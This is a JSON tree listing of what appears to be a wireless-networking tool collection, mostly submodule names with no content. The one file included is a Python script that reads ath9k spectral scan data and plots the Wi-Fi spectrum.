          "type": "commit",
          "content": null
        },
        {
          "name": "hostapd-wpe-extended",
          "type": "commit",
          "content": null
        },
        {
          "name": "hostapd-wpe-openwrt",
          "type": "commit",
          "content": null
        },
        {
          "name": "hostapd.py",
          "type": "commit",
          "content": null
        },
        {
          "name": "hotspotd",
          "type": "commit",
          "content": null
        },
        {
          "name": "huawei_wifi",
          "type": "commit",
          "content": null
        },
        {
          "name": "huntpineapples",
          "type": "tree",
          "content": null
        },
        {
          "name": "hwk",
          "type": "tree",
          "content": null
        },
        {
          "name": "iSniff-GPS",
          "type": "commit",
          "content": null
        },
        {
          "name": "iStupid",
          "type": "commit",
          "content": null
        },
        {
          "name": "ieiit-kbp4111-80211",
          "type": "commit",
          "content": null
        },
        {
          "name": "iitis-generator",
          "type": "commit",
          "content": null
        },
        {
          "name": "invasit-network",
          "type": "commit",
          "content": null
        },
        {
          "name": "itamae",
          "type": "commit",
          "content": null
        },
        {
          "name": "iwraw",
          "type": "commit",
          "content": null
        },
        {
          "name": "jfap",
          "type": "commit",
          "content": null
        },
        {
          "name": "js-packet-injector",
          "type": "commit",
          "content": null
        },
        {
          "name": "kali-wireless",
          "type": "commit",
          "content": null
        },
        {
          "name": "karma",
          "type": "commit",
          "content": null
        },
        {
          "name": "killosx",
          "type": "commit",
          "content": null
        },
        {
          "name": "kismet",
          "type": "commit",
          "content": null
        },
        {
          "name": "kismet-deauth-wpa2-handshake-plugin",
          "type": "commit",
          "content": null
        },
        {
          "name": "kismet-fork",
          "type": "commit",
          "content": null
        },
        {
          "name": "kismet_baro",
          "type": "commit",
          "content": null
        },
        {
          "name": "kismetclient",
          "type": "commit",
          "content": null
        },
        {
          "name": "kismeth2earth",
          "type": "commit",
          "content": null
        },
        {
          "name": "kismon",
          "type": "commit",
          "content": null
        },
        {
          "name": "krack-poc",
          "type": "commit",
          "content": null
        },
        {
          "name": "krackattack-all-zero-tk-key",
          "type": "commit",
          "content": null
        },
        {
          "name": "krackattacks",
          "type": "commit",
          "content": null
        },
        {
          "name": "krackattacks-Test-Vulnerability",
          "type": "commit",
          "content": null
        },
        {
          "name": "krackattacks-pineapple",
          "type": "commit",
          "content": null
        },
        {
          "name": "krackattacks-poc-zerokey",
          "type": "commit",
          "content": null
        },
        {
          "name": "krackattacks-scripts",
          "type": "commit",
          "content": null
        },
        {
          "name": "krackattacks-test-ap-ft",
          "type": "commit",
          "content": null
        },
        {
          "name": "krackdetector",
          "type": "commit",
          "content": null
        },
        {
          "name": "krackinfo",
          "type": "commit",
          "content": null
        },
        {
          "name": "lianwifi",
          "type": "commit",
          "content": null
        },
        {
          "name": "libairpcap-nl",
          "type": "commit",
          "content": null
        },
        {
          "name": "libcowpatty",
          "type": "commit",
          "content": null
        },
        {
          "name": "liber80211",
          "type": "commit",
          "content": null
        },
        {
          "name": "libfcap",
          "type": "commit",
          "content": null
        },
        {
          "name": "libmoep-1.1",
          "type": "tree",
          "content": null
        },
        {
          "name": "libnl",
          "type": "commit",
          "content": null
        },
        {
          "name": "libpcap-80211-c",
          "type": "commit",
          "content": null
        },
        {
          "name": "libs",
          "type": "tree",
          "content": null
        },
        {
          "name": "libuwifi",
          "type": "commit",
          "content": null
        },
        {
          "name": "linux-80211n-csitool",
          "type": "commit",
          "content": null
        },
        {
          "name": "linux-wifi-reconnector",
          "type": "commit",
          "content": null
        },
        {
          "name": "linux-wifi-tools",
          "type": "commit",
          "content": null
        },
        {
          "name": "linux_wifi_config",
          "type": "commit",
          "content": null
        },
        {
          "name": "list-aps",
          "type": "commit",
          "content": null
        },
        {
          "name": "lorcon",
          "type": "commit",
          "content": null
        },
        {
          "name": "lowlevel",
          "type": "tree",
          "content": null
        },
        {
          "name": "lrc",
          "type": "commit",
          "content": null
        },
        {
          "name": "mac-analyzer",
          "type": "commit",
          "content": null
        },
        {
          "name": "mac80211-user",
          "type": "commit",
          "content": null
        },
        {
          "name": "madwifi-be",
          "type": "commit",
          "content": null
        },
        {
          "name": "madwifi-hopping",
          "type": "commit",
          "content": null
        },
        {
          "name": "make-a-new-mac80211-to-wirelessAP",
          "type": "commit",
          "content": null
        },
        {
          "name": "mana",
          "type": "commit",
          "content": null
        },
        {
          "name": "manafix",
          "type": "commit",
          "content": null
        },
        {
          "name": "marfil",
          "type": "commit",
          "content": null
        },
        {
          "name": "mass-deauth",
          "type": "commit",
          "content": null
        },
        {
          "name": "mass-deauth-attack",
          "type": "commit",
          "content": null
        },
        {
          "name": "mdk3_6.1",
          "type": "commit",
          "content": null
        },
        {
          "name": "mdk4",
          "type": "commit",
          "content": null
        },
        {
          "name": "milicone",
          "type": "commit",
          "content": null
        },
        {
          "name": "mitm-helper-wifi",
          "type": "commit",
          "content": null
        },
        {
          "name": "mitm-rogue-WiFi-AP",
          "type": "commit",
          "content": null
        },
        {
          "name": "mitmAP",
          "type": "commit",
          "content": null
        },
        {
          "name": "mitm_rogue_wifi_ap",
          "type": "commit",
          "content": null
        },
        {
          "name": "modwifi",
          "type": "commit",
          "content": null
        },
        {
          "name": "modwifi-tools",
          "type": "commit",
          "content": null
        },
        {
          "name": "moepdefend",
          "type": "commit",
          "content": null
        },
        {
          "name": "monit-hostapd",
          "type": "commit",
          "content": null
        },
        {
          "name": "monmob",
          "type": "commit",
          "content": null
        },
        {
          "name": "mr-nosy",
          "type": "commit",
          "content": null
        },
        {
          "name": "mt76",
          "type": "commit",
          "content": null
        },
        {
          "name": "mt7601u",
          "type": "commit",
          "content": null
        },
        {
          "name": "mupe",
          "type": "commit",
          "content": null
        },
        {
          "name": "mwlwifi",
          "type": "commit",
          "content": null
        },
        {
          "name": "nabui",
          "type": "commit",
          "content": null
        },
        {
          "name": "naive_project",
          "type": "commit",
          "content": null
        },
        {
          "name": "netattack",
          "type": "commit",
          "content": null
        },
        {
          "name": "ninjaberry",
          "type": "commit",
          "content": null
        },
        {
          "name": "null-packet-wifi-prompt",
          "type": "commit",
          "content": null
        },
        {
          "name": "nzyme",
          "type": "commit",
          "content": null
        },
        {
          "name": "oculus",
          "type": "commit",
          "content": null
        },
        {
          "name": "ofxSniffer",
          "type": "commit",
          "content": null
        },
        {
          "name": "open-ath9k-htc-firmware",
          "type": "commit",
          "content": null
        },
        {
          "name": "openCAPWAP",
          "type": "commit",
          "content": null
        },
        {
          "name": "openrtls",
          "type": "commit",
          "content": null
        },
        {
          "name": "openwifi",
          "type": "commit",
          "content": null
        },
        {
          "name": "openwifimap-api",
          "type": "commit",
          "content": null
        },
        {
          "name": "openwips-ng",
          "type": "commit",
          "content": null
        },
        {
          "name": "osx-wifi-scan",
          "type": "commit",
          "content": null
        },
        {
          "name": "osx-wificleaner",
          "type": "commit",
          "content": null
        },
        {
          "name": "packet-injector",
          "type": "commit",
          "content": null
        },
        {
          "name": "packetEssentials",
          "type": "commit",
          "content": null
        },
        {
          "name": "packetparser",
          "type": "commit",
          "content": null
        },
        {
          "name": "packetvector",
          "type": "commit",
          "content": null
        },
        {
          "name": "panoptiphone",
          "type": "commit",
          "content": null
        },
        {
          "name": "parsecaps",
          "type": "commit",
          "content": null
        },
        {
          "name": "pcap2xml",
          "type": "commit",
          "content": null
        },
        {
          "name": "pcap80211analyzer",
          "type": "commit",
          "content": null
        },
        {
          "name": "peapwn",
          "type": "commit",
          "content": null
        },
        {
          "name": "penetrator-wps",
          "type": "commit",
          "content": null
        },
        {
          "name": "phalloc-sniffer",
          "type": "commit",
          "content": null
        },
        {
          "name": "phpreaver",
          "type": "commit",
          "content": null
        },
        {
          "name": "phystats",
          "type": "commit",
          "content": null
        },
        {
          "name": "pinecone",
          "type": "commit",
          "content": null
        },
        {
          "name": "piwifipineapple",
          "type": "commit",
          "content": null
        },
        {
          "name": "pixie-dust",
          "type": "tree",
          "content": null
        },
        {
          "name": "pixiewps",
          "type": "commit",
          "content": null
        },
        {
          "name": "pixiewps-android",
          "type": "commit",
          "content": null
        },
        {
          "name": "platform-hostapd",
          "type": "commit",
          "content": null
        },
        {
          "name": "pmkid-extractor",
          "type": "commit",
          "content": null
        },
        {
          "name": "probe-stalker",
          "type": "commit",
          "content": null
        },
        {
          "name": "probeSniffer",
          "type": "commit",
          "content": null
        },
        {
          "name": "probecap",
          "type": "commit",
          "content": null
        },
        {
          "name": "probemon",
          "type": "commit",
          "content": null
        },
        {
          "name": "probequest",
          "type": "commit",
          "content": null
        },
        {
          "name": "probequest-framework",
          "type": "commit",
          "content": null
        },
        {
          "name": "probr-analysis",
          "type": "commit",
          "content": null
        },
        {
          "name": "probr-core",
          "type": "commit",
          "content": null
        },
        {
          "name": "py80211",
          "type": "commit",
          "content": null
        },
        {
          "name": "pyDot11",
          "type": "commit",
          "content": null
        },
        {
          "name": "py_DD_WRT_Remote_Mac_Adder",
          "type": "commit",
          "content": null
        },
        {
          "name": "pyfi",
          "type": "commit",
          "content": null
        },
        {
          "name": "pykismetstats",
          "type": "commit",
          "content": null
        },
        {
          "name": "pylorcon2",
          "type": "commit",
          "content": null
        },
        {
          "name": "pyrcrack",
          "type": "commit",
          "content": null
        },
        {
          "name": "python-radiotap",
          "type": "commit",
          "content": null
        },
        {
          "name": "python-wifi-survey-heatmap",
          "type": "commit",
          "content": null
        },
        {
          "name": "python-wireless-attacks",
          "type": "commit",
          "content": null
        },
        {
          "name": "python3-wifi",
          "type": "commit",
          "content": null
        },
        {
          "name": "pythonAir",
          "type": "commit",
          "content": null
        },
        {
          "name": "pythonwifi",
          "type": "commit",
          "content": null
        },
        {
          "name": "pyxiewps",
          "type": "commit",
          "content": null
        },
        {
          "name": "qca-swiss-army-knife",
          "type": "commit",
          "content": null
        },
        {
          "name": "raw-packet",
          "type": "commit",
          "content": null
        },
        {
          "name": "react80211",
          "type": "commit",
          "content": null
        },
        {
          "name": "realtek_rtwifi",
          "type": "commit",
          "content": null
        },
        {
          "name": "reaver-ui",
          "type": "commit",
          "content": null
        },
        {
          "name": "reaver-webui",
          "type": "commit",
          "content": null
        },
        {
          "name": "reaver-wps",
          "type": "commit",
          "content": null
        },
        {
          "name": "reaver-wps-fork-t6x",
          "type": "commit",
          "content": null
        },
        {
          "name": "refluxion",
          "type": "commit",
          "content": null
        },
        {
          "name": "remoteapd",
          "type": "commit",
          "content": null
        },
        {
          "name": "resfi",
          "type": "commit",
          "content": null
        },
        {
          "name": "rifsniff",
          "type": "commit",
          "content": null
        },
        {
          "name": "rogue",
          "type": "commit",
          "content": null
        },
        {
          "name": "rogueDetect",
          "type": "commit",
          "content": null
        },
        {
          "name": "rogueap",
          "type": "commit",
          "content": null
        },
        {
          "name": "rogueap-launcher",
          "type": "commit",
          "content": null
        },
        {
          "name": "roguehostapd",
          "type": "commit",
          "content": null
        },
        {
          "name": "rollmac",
          "type": "commit",
          "content": null
        },
        {
          "name": "rssi",
          "type": "commit",
          "content": null
        },
        {
          "name": "rtl8812au",
          "type": "commit",
          "content": null
        },
        {
          "name": "scapy-dot11-toolkit",
          "type": "commit",
          "content": null
        },
        {
          "name": "scapy-fakeap",
          "type": "commit",
          "content": null
        },
        {
          "name": "scapy-rssi",
          "type": "commit",
          "content": null
        },
        {
          "name": "scapy-survey",
          "type": "commit",
          "content": null
        },
        {
          "name": "scapybase",
          "type": "commit",
          "content": null
        },
        {
          "name": "setbssid",
          "type": "commit",
          "content": null
        },
        {
          "name": "sigmon",
          "type": "commit",
          "content": null
        },
        {
          "name": "ska",
          "type": "tree",
          "content": null
        },
        {
          "name": "skybluetero",
          "type": "commit",
          "content": null
        },
        {
          "name": "sly-fi",
          "type": "commit",
          "content": null
        },
        {
          "name": "smoothie",
          "type": "commit",
          "content": null
        },
        {
          "name": "sniffMyPackets",
          "type": "commit",
          "content": null
        },
        {
          "name": "sniffer_cocoa.app",
          "type": "tree",
          "content": null
        },
        {
          "name": "snifflab",
          "type": "commit",
          "content": null
        },
        {
          "name": "snoopy-ng",
          "type": "commit",
          "content": null
        },
        {
          "name": "sparrow-wifi",
          "type": "commit",
          "content": null
        },
        {
          "name": "speccy",
          "type": "commit",
          "content": null
        },
        {
          "name": "spectrum.py",
          "type": "blob",
          "size": 3.921875,
          "content": "#!/usr/bin/env python\n#\n# Copyright 2015 Bastian Bloessl <bloessl@ccs-labs.org>\n#\n# This program is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n# \n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n# GNU General Public License for more details.\n# \n# You should have received a copy of the GNU General Public License\n# along with this program. If not, see <http://www.gnu.org/licenses/>.\n\nimport array\nimport struct\nimport sys\nimport time\n\nfrom subprocess import call\n\nimport numpy as np\nimport pandas as pd\nimport matplotlib\nmatplotlib.use('TkAgg')\nimport matplotlib.pyplot as plt\n\nphy = \"phy0\"\n\ncall(\"echo chanscan > /sys/kernel/debug/ieee80211/\" + phy + \"/ath9k_htc/spectral_scan_ctl\", shell=True)\n\nplt.ion()\nfig = plt.figure()\nax = fig.add_subplot(111)\n\nscatter, = ax.plot([2400, 2480], [-160, 50], 'r*')\nscatter_min, = ax.plot([], [], 'bx')\nscatter_max, = ax.plot([], [], 'go')\nplt.show()\n\n\nprint \"time,freq,signal\"\n\nwhile True:\n\n    ### do measurement\n    call(\"iw dev wlan0 scan &>/dev/null\", shell=True)\n    call(\"cat /sys/kernel/debug/ieee80211/\" + phy + \"/ath9k_htc/spectral_scan0 > data\", shell=True)\n\n    with open(\"data\", \"rb\") as file:\n\n        data = file.read(76)\n\n        x = []\n        y = []\n        now = time.time()\n\n        while data != \"\":\n            t, length = struct.unpack(\">BH\", data[0:3])\n\n            if t != 1 or length != 73:\n                print \"only 20MHz supported atm\"\n                sys.exit(1)\n\n            ### metadata\n            max_exp, freq, rssi, noise, max_magnitude, max_index, bitmap_weight, tsf = struct.unpack('>BHbbHBBQ', data[3:20])\n\n            #print \"max_exp: \"       + str(max_exp)\n            #print \"freq: \"          + str(freq)\n            #print \"rssi: \"          + str(rssi)\n            #print \"noise: \"         + str(noise)\n            #print \"max_magnitude: \" + str(max_magnitude)\n            #print \"max_index: \"     + str(max_index)\n            #print \"bitmap_weight: \" + str(bitmap_weight)\n            #print \"tsf: \"           + str(tsf)\n\n            ### measurements\n            measurements = array.array(\"B\")\n            measurements.fromstring(data[20:])\n\n            squaresum = sum([(m << max_exp)**2 for m in measurements])\n            if squaresum == 0:\n                data = file.read(76)\n                continue\n\n            for i, m in enumerate(measurements):\n                if m == 0 and max_exp == 0:\n                    m = 1\n                v = 10.0**((noise + rssi + 20.0 * np.log10(m << max_exp) - 10.0 * np.log10(squaresum))/10.0)\n\n                if i < 28:\n                    f = freq - (20.0 / 64) * (28 - i)\n                else:\n                    f = freq + (20.0 / 64) * (i - 27)\n\n                x.append(f)\n                y.append(v)\n                print str(now) + \",\" + str(f) + \",\" + str(v)\n\n            data = file.read(76)\n\n        df = pd.DataFrame(np.matrix([x, y]).T, columns = [\"freq\", \"rssi\"])\n        group = df.groupby('freq')\n        spectrum = group.mean()\n        spectrum_min = group.min()\n        spectrum_max = group.max()\n\n        ### print output\n        #sys.stdout.write(str(time.time()))\n        #for freq, row in spectrum.iterrows():\n        #    sys.stdout.write(\",\" + str(freq) + \":\" + str(row['rssi']))\n        #sys.stdout.write(\"\\n\")\n        scatter.set_xdata(spectrum.index)\n        scatter.set_ydata([10.0 * np.log10(val) for val in spectrum['rssi']])\n\n        scatter_min.set_xdata(spectrum_min.index)\n        scatter_min.set_ydata([10.0 * np.log10(val) for val in spectrum_min['rssi']])\n\n        scatter_max.set_xdata(spectrum_max.index)\n        scatter_max.set_ydata([10.0 * np.log10(val) for val in spectrum_max['rssi']])\n        fig.canvas.draw()\n\n"
        },
        {
          "name": "split",
          "type": "commit",
          "content": null
        },
        {
          "name": "startools",
          "type": "commit",
          "content": null
        },
        {
          "name": "terUNIFI",
          "type": "commit",
          "content": null
        },
        {
          "name": "txpower_RTL8187",
          "type": "commit",
          "content": null
        },
        {
          "name": "uploadwpa",
          "type": "commit",
          "content": null
        },
        {
          "name": "waidps",
          "type": "commit",
          "content": null
        },
        {
          "name": "wallofshame",
          "type": "commit",
          "content": null
        },
        {
          "name": "wapi",
          "type": "commit",
          "content": null
        },
        {
          "name": "warcarrier",
          "type": "commit",
          "content": null
        },
        {
          "name": "wavecrack",
          "type": "commit",
          "content": null
        },
        {
          "name": "wbc-utils",
          "type": "commit",
          "content": null
        },
        {
          "name": "websploit",
          "type": "commit",
          "content": null
        },
        {
          "name": "whereami",
          "type": "commit",
          "content": null
        },
        {
          "name": "whoishere.py",
          "type": "commit",
          "content": null
        },
        {
          "name": "wi-door",
          "type": "commit",
          "content": null
        },
        {
          "name": "wi-finder",
          "type": "commit",
          "content": null
        },
        {
          "name": "wi5-aggregation",
          "type": "commit",
          "content": null
        },
        {
          "name": "widowmaker",
          "type": "commit",
          "content": null
        },
        {
          "name": "wids-wips",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi-ap",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi-beeper",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi-bruteforcer-fsecurify",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi-configurator",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi-contour",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi-cracking",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi-data-safari",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi-default-password",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi-dump-analysis",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi-frequency-hacker",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi-hacker",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi-harvester",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi-heatmap",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi-linux",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi-locator",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi-mac-tracking",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi-monitor",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi-pentesting-guide",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi-scan",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi-scan-new",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi-test",
          "type": "tree",
          "content": null
        },
        {
          "name": "wifi-txpower-unlocker",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifiBuddy",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifiJamMac",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifiScanMap",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi_based_population_estimator",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi_beacons",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi_decode",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi_dump-tmpfs",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi_dump_parser-v3",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi_geolocation",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi_honey",
          "type": "tree",
          "content": null
        },
        {
          "name": "wifi_landing_2",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi_localization",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi_monitor",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifi_statistics",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifibang",
          "type": "commit",
          "content": null
        },
        {
          "name": "wificurse",
          "type": "tree",
          "content": null
        },
        {
          "name": "wifidec",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifidog-gateway",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifiexplorer-sensor",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifight",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifijammer",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifikicker",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifikill",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifimitm",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifimonster",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifiphisher",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifipumpkin3",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifirxpower",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifiscanvisualizer",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifisoftap",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifispy",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifitap",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifite",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifite-mod-pixiewps",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifite-openwrt",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifite-patcher",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifite2",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifite2-docker",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifite2-requirements",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifite2mod",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifite3",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifiteinstall",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifiteintaller",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifitracker",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifivis",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifiwho",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifresti",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifuzz",
          "type": "commit",
          "content": null
        },
        {
          "name": "wifuzzit",
          "type": "commit",
          "content": null
        },
        {
          "name": "wime",
          "type": "commit",
          "content": null
        },
        {
          "name": "win32wifi",
          "type": "commit",
          "content": null
        },
        {
          "name": "wipi",
          "type": "commit",
          "content": null
        },
        {
          "name": "wireless",
          "type": "commit",
          "content": null
        },
        {
          "name": "wireless-ids",
          "type": "commit",
          "content": null
        },
        {
          "name": "wireless-info",
          "type": "commit",
          "content": null
        },
        {
          "name": "wireless-radar",
          "type": "commit",
          "content": null
        },
        {
          "name": "wireless-regdb",
          "type": "commit",
          "content": null
        },
        {
          "name": "wireless-rool-nodejs",
          "type": "commit",
          "content": null
        },
        {
          "name": "wireless_RSSI",
          "type": "commit",
          "content": null
        },
        {
          "name": "wireless_half-mini",
          "type": "commit",
          "content": null
        },
        {
          "name": "wirelessjammer",
          "type": "commit",
          "content": null
        },
        {
          "name": "wirespy",
          "type": "commit",
          "content": null
        },
        {
          "name": "wit",
          "type": "commit",
          "content": null
        },
        {
          "name": "wiwo",
          "type": "commit",
          "content": null
        },
        {
          "name": "wlan-macos",
          "type": "commit",
          "content": null
        },
        {
          "name": "wlan-pos",
          "type": "commit",
          "content": null
        },
        {
          "name": "wlan-stats",
          "type": "commit",
          "content": null
        },
        {
          "name": "wlanMonGenerator",
          "type": "commit",
          "content": null
        },
        {
          "name": "wmd",
          "type": "commit",
          "content": null
        },
        {
          "name": "wmon",
          "type": "commit",
          "content": null
        },
        {
          "name": "wobs",
          "type": "commit",
          "content": null
        },
        {
          "name": "wombat",
          "type": "commit",
          "content": null
        },
        {
          "name": "wpa-autopwn",
          "type": "commit",
          "content": null
        },
        {
          "name": "wpa-bruteforcer",
          "type": "commit",
          "content": null
        },
        {
          "name": "wpa2-enterprise-attack",
          "type": "commit",
          "content": null
        },
        {
          "name": "wpa2hc",
          "type": "commit",
          "content": null
        },
        {
          "name": "wpa2own",
          "type": "commit",
          "content": null
        },
        {
          "name": "wpacrack",
          "type": "commit",
          "content": null
        },
        {
          "name": "wpakey",
          "type": "commit",
          "content": null
        },
        {
          "name": "wpasnff",
          "type": "commit",
          "content": null
        },
        {
          "name": "wpe-parse",
          "type": "commit",
          "content": null
        },
        {
          "name": "wperf",
          "type": "commit",
          "content": null
        },
        {
          "name": "wps",
          "type": "commit",
          "content": null
        },
        {
          "name": "wps-scripts",
          "type": "commit",
          "content": null
        },
        {
          "name": "wpscrack",
          "type": "commit",
          "content": null
        },
        {
          "name": "wpseyes",
          "type": "commit",
          "content": null
        },
        {
          "name": "wpsoffline",
          "type": "commit",
          "content": null
        },
        {
          "name": "wraith",
          "type": "commit",
          "content": null
        },
        {
          "name": "wspy",
          "type": "commit",
          "content": null
        },
        {
          "name": "wtf",
          "type": "commit",
          "content": null
        },
        {
          "name": "zarp",
          "type": "commit",
          "content": null
        },
        {
          "name": "zizzania",
          "type": "commit",
          "content": null
        }
      ]
    }
  ]
}